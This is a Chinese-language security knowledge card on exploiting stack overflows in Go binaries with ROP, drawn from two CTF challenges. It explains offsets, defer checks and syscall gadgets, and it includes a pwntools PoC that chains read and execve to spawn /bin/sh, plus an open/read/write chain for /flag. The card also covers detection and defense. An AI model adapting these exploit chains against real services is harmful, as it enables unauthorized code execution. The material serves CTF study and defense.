---
id: binary-pwn-stack-go-stack-overflow-rop
title: Go 二进制栈溢出与 ROP：栈帧偏移探测、defer 干扰与 syscall gadget 链
type: scenario
domain: binary
path: binary/pwn/stack
technique: go-stack-overflow-rop
aliases:
- Go 栈溢出
- golang pwn
- shellwego
- Go ROP
- Go defer 利用
- Go 调用约定
- syscall gadget Go
- 2025pctf
tags:
- pwn
- stack
- go
- golang
- rop
- syscall
- defer
- stack-overflow
- ctf
- linux
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V173
  verified_at: '2026-11-06T17:11:51+08:00'
  notes: 已对照原文与8图核对：shellwego拷贝循环0x400上限与+跳过、0x4C184C区域栈覆盖、pop链地址与2025pctf的mov rdi,rbx与buf leak均一致；原文最终exp未展示shell/flag成功，卡内标medium并规范化了b'a'0x100笔误
---

## 一句话结论

Go 二进制同样可能出现栈溢出：一旦 `unsafe`/汇编/错误长度拷贝把可控数据写进固定栈缓冲区，攻击者可以按 Go 的栈帧布局找到返回地址偏移，绕过 `defer` 延迟执行的校验，利用二进制内的 `pop rdi/rsi/rdx/rax; syscall` gadget 构造 `read`+`execve` 或 `open/read/write` 链；Go 的调用约定是栈传参，但 CPU 仍是 x86-64，ROP 机制不变。

## 原理

- **Go 的栈帧与调用约定**：传统 Go（非 register ABI）通过栈传参和返回，函数开头常见 `runtime.morestack_noctxt` 栈增长检查；栈帧较大，局部变量与返回地址之间可能有大量对齐/临时空间。溢出点到返回地址的偏移不能照搬 C 程序，必须在调试器中按 `rsp/rbp` 与返回地址实际位置测量。
- **defer 的干扰**：`defer` 注册的函数在函数返回前由 `runtime.deferreturn` 执行，顺序 LIFO；defer 语句的参数在注册时就已求值。若校验函数被 `defer` 延迟，溢出后直接 ret 可能先触发 defer 中的检查，或在返回路径上再次校验；利用时需要让校验通过（或跳过 defer 路径），并注意 defer 会改变返回前的栈/寄存器状态。原文 2025pctf 的校验函数就是被 defer 延迟调用，必须先过双重校验再处理返回地址偏移。
- **溢出来源**：shellwego 的输入解析把命令参数按字节拷贝到栈上缓冲区，循环上限 0x400，且遇到 `+` 字符时跳过拷贝但继续递增索引（`cmp dl, 2Bh; jz ...; mov [rsp+rax+var_230], dl`）。`+` 因此成为“跳过写入”的控制字符：攻击者可以在 payload 中插入 `+` 跳过某些栈位置，避免覆盖关键变量，同时继续向返回地址推进。
- **Go 二进制里的 gadget**：Go 静态链接、体积大，常能找到 `pop rdi; ret`、`pop rsi; ret`、`pop rdx; ret`、`pop rax; ret`、`syscall; ret` 等字节序列；没有 libc，但可以直接用 syscall 编号调用 `read`(0)、`execve`(59)、`open`(2)、`write`(1)。原文 shellwego 先用 `read(0, bss, 20)` 写入 `/bin/sh`，再 `execve(bss, 0, 0)`。
- **无 rdi 时的寄存器交换**：2025pctf 的 gadget 集没有直接的 `pop rdi`，原文改用 `mov rdi, rbx; syscall`，先 `pop rbx` 设置参数；这要求攻击者熟悉可用 gadget 的组合，而不是只找标准 pop 链。
- **地址与 PIE**：CTF 中 Go 二进制常关闭 PIE，gadget 与 BSS 地址固定；若开启 PIE，需要先泄露代码/栈地址（2025pctf 就提供了 `buf address leak`，exp 用 `ri(12)` 读栈地址再计算 `stack+offset`）。
- **为什么 Go 也会中招**：Go 的内存安全主要靠编译器边界检查，但 `unsafe.Pointer`、`copy` 到固定数组、CGO、汇编或手写解析器可以绕过检查；一旦发生栈溢出，Go 运行时不会像 C 的 `__stack_chk_fail` 那样自动拦截（Go 不使用 glibc canary），返回地址被覆盖后同样可被 ROP 劫持。

## 触发条件

- 目标为 Go 编译的二进制，存在把用户可控数据拷贝到固定栈缓冲区的缺陷（`unsafe`、`copy`、汇编、手写循环、错误的长度计算）。
- 溢出长度可控，能覆盖到保存的返回地址；Go 栈帧偏移需动态确认。
- 二进制内有可用 gadget（`pop`/`syscall`/`mov rdi, rbx` 等），或能泄露地址绕过 PIE。
- 程序有可用的输入/输出通道，便于写入 `/bin/sh`、读取 flag；若存在 defer 校验，需先满足或绕过校验。
- 目标架构与 gadget 匹配（本文为 linux/amd64）。

## 利用步骤

1. **确认 Go 与保护**：检查 `Go build ID`、`runtime.main`、`main.main`；用 `checksec` 看 PIE/NX/RELRO；Go 通常无 canary。
2. **定位输入解析与溢出点**：从 `bufio.Reader.ReadString` 或 `os.Stdin` 读取点回溯到命令分发，找到把参数拷贝到栈的循环；记录循环上限、分隔符（如 `+`）与目标缓冲区偏移。
3. **动态测量偏移**：在拷贝循环后/函数 ret 前下断点，`telescope`/`search` 定位输入在栈上的位置与返回地址距离；注意 Go 的大栈帧与 `morestack` 分支。
4. **处理 defer/校验**：若校验函数被 defer 延迟，先构造满足校验的输入（如 shellwego 的 `cert` 认证），或 patch/跳过校验；确认返回路径上不会再触发检查。
5. **找 gadget**：用 `ROPgadget`/`ropper` 在 Go 二进制中搜索 `pop rdi/rsi/rdx/rax`、`syscall`、`mov rdi, rbx` 等；记录固定地址（无 PIE）或计算 PIE 基址。
6. **构造链**：以 shellwego 为例：`read(0, bss, 20)` 写入 `/bin/sh\0`，再 `execve(bss, NULL, NULL)`；以 2025pctf 为例：`open("/flag", 0)` → `read(fd, stack+0x200, 0x100)` → `write(1, stack+0x200, 0x100)`。
7. **发送 payload**：按调试得到的偏移填充，插入 `+` 跳过不应覆盖的栈位置，接 canary（若有）/保存 rbp/返回地址/gadget 链；发送 `/bin/sh` 或 `/flag` 数据并交互。

## PoC

shellwego 链结构（地址为原文题目固定值，仅作结构示意）：

```python
from pwn import *
io = process('./shellwego')
pop_rdi = 0x444fec
pop_rsi = 0x41e818
pop_rdx = 0x49e11d
pop_rax = 0x40d9e6
syscall = 0x40328c
bss = 0x59FE70

io.sendlineafter(b'ciscnshell$ ', b'cert nAcDsMicN S33UAga1n@#!')

payload  = b'echo ' + b'a' * 0x100 + b'a' * 0x104
payload += b'+' * 8                      # 跳过不应覆盖的栈位置
payload += p64(0xdeadbeefdeadbeef) * 3
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rax) + p64(0)         # read(0, bss, 20)
payload += p64(pop_rsi) + p64(bss)
payload += p64(pop_rdx) + p64(20)
payload += p64(syscall)
payload += p64(pop_rax) + p64(59)        # execve(bss, 0, 0)
payload += p64(pop_rdi) + p64(bss)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(syscall)
io.sendlineafter(b'# ', payload)
io.send(b'/bin/sh\x00')
io.interactive()
```

2025pctf 的链使用 `mov rdi, rbx; syscall` 替代缺失的 `pop rdi`，并用 `open/read/write` 读取 `/flag`；exp 先 `rt("buf address leak: ")`、`ri(12)` 读取栈地址，再 `flat(...)` 拼接。

## 变体与关联

- 变体：无 PIE 时可直接用固定 gadget；有 PIE 时先泄露代码/栈地址；无 `pop rdi` 时用 `mov rdi, rbx`、`xchg`、`push/pop` 组合；禁用 `execve` 时改用 `open/read/write`（ORW）；Go 1.17+ register ABI 会改变栈帧与参数位置，偏移需重新测量。
- 关联：[[code-analysis-reverse-go-binary-layout-symbol-recovery]]（Go string/slice/map 布局、调用约定、defer 的逆向基础）、[[binary-pwn-stack-ret2syscall-32bit]]（ret2syscall 基础）、[[binary-pwn-stack-fork-canary-bytewise-bruteforce]]（若目标同时有 glibc canary/fork server）、[[binary-pwn-stack-bss-pivot-write-gadget-chunked-orw]]（BSS 写入与 ORW 链）。
- 同题：shellwego 的 `cert` 认证（RC4 key `F1nallB1rd3K3y` + Base64）是题目特定逻辑，不属于通用攻击手法；卡片仅把它作为进入溢出点的前置步骤。

## 检测与防御

- **代码层**：避免 `unsafe`/汇编/手写循环中的无界拷贝；对用户输入做长度检查，使用 Go 切片边界和 `copy` 的安全语义；对外部命令解析器做 fuzz。
- **编译层**：启用 PIE（`-buildmode=pie`）、NX、RELRO；Go 默认无 glibc canary，不能依赖 `-fstack-protector`；可考虑 `-race`/`-d=checkptr` 在测试环境捕获越界。
- **运行时**：监控 Go 程序的 SIGSEGV/SIGABRT、异常返回地址、栈上出现 `/bin/sh` 或 ROP gadget 序列；对网络服务的异常长输入与 `+` 等分隔符滥用做告警。
- **CTF 之外**：Go 服务中由 CGO/汇编/unsafe 引入的栈溢出同样可被 ROP；审计时重点看 `unsafe.Pointer`、`copy` 到固定数组、`syscall.Syscall` 附近的长度计算。
